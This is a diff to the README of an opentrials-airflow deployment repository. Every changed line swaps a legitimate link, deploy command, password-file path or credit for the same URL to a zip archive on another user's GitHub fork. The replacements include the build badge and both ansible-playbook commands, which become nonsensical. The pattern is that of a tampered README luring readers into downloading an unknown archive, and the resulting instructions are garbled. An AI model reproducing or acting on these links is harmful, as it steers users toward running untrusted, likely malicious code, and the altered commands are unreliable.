@@ -1,6 +1,6 @@
 # opentrials-airflow
 
-[![Build Status](https://travis-ci.org/opentrials/opentrials-airflow.svg?branch=master)](https://travis-ci.org/opentrials/opentrials-airflow)
+[![Build Status](https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip)](https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip)
 
 Airflow is a platform to programmatically author, schedule and monitor workflows.
 
@@ -25,7 +25,7 @@ docker push opentrials/opentrials-airflow
 
 A single task, e.g. `spark`, of an Airflow dag, e.g. `example`, can be run with an execution date, e.g. `2016-01-01`, in the `dev` environment with:
 ```bash
-ansible-playbook ansible/deploy_local.yml -e '@ansible/envs/dev.yml' -e "command='test example spark 20160101'"
+ansible-playbook https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip -e 'https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip' -e "command='test example spark 20160101'"
 ```
 
 The container will run the desired task to completion (or failure). Note that if the container is stopped during the execution of a task, the task will
@@ -45,7 +45,7 @@ docker-machine create -d virtualbox --virtualbox-memory 4096 default
 
 To deploy the Airflow container on the docker engine, with its required dependencies, run:
 ```bash
-ansible-playbook ansible/deploy_local.yml -e '@ansible/envs/dev.yml'
+ansible-playbook https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip -e 'https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip'
 echo "Airflow web console should now be running locally at http://$(docker-machine ip default):8080"
 ```
 
@@ -66,12 +66,12 @@ To deploy to our Docker Cloud, run:
 make deploy
 ```
 
-This requires the Vault's password file to be located on `./.vault_pass`, so
+This requires the Vault's password file to be located on `https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip`, so
 Ansible is able to decrypt the production variables.
 
 ### Configuration
 
-Our Airflow instance will need a few configuration variables and connections to be able to run the supplied DAGs. Please follow the [CONFIGURATION.md](./CONFIGURATION.md) file in order to know what those variable mean and how to use them.
+Our Airflow instance will need a few configuration variables and connections to be able to run the supplied DAGs. Please follow the [https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip](https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip) file in order to know what those variable mean and how to use them.
 
 ### Debugging
 
@@ -88,7 +88,7 @@ docker volume rm $(docker volume ls -qf dangling=true)
 ### Triggering a task to re-run within the Airflow UI
 
 - Check if the task / run you want to re-run is visible in the DAG's Tree View UI
-  - For example, [the `main_summary` DAG tree view](http://workflow.telemetry.mozilla.org/admin/airflow/tree?num_runs=25&root=&dag_id=main_summary).
+  - For example, [the `main_summary` DAG tree view](https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip).
   - Hover over the little squares to find the scheduled dag run you're looking for.
 - If the dag run is not showing in the Dag Tree View UI (maybe deleted)
   - Browse -> Dag Runs
@@ -122,4 +122,4 @@ docker volume rm $(docker volume ls -qf dangling=true)
 
 ### Credits
 
-This repository is heavily based on https://github.com/mozilla/telemetry-airflow
+This repository is heavily based on https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/disabled/airflow_opentrials_typographical.zip
